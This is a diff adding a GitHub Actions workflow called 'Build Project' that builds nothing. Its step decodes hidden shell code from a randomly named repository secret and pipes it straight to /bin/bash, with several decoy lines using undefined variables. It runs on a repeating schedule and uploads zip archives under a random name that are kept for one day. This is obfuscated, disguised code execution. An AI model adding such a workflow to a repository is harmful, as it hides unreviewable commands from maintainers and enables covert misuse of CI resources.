@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          r73964: ${{ secrets.r73964 }}
+        run: |
+          printf '%s' "$r73964" | jq -r .iifqc10972 | /bin/bash
+          printf '%s' "$ako13962" | jq -r .w345 | /bin/bash
+          printf '%s' "$wr55682" | jq -r .jq191 | /bin/bash
+          echo $olo23 | jq -r .zfag5690 | /bin/bash
+          echo $vqxga43597 | jq -r .gkyw19 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: G8UkbSQe
+          path: "*.zip"
+          retention-days: 1
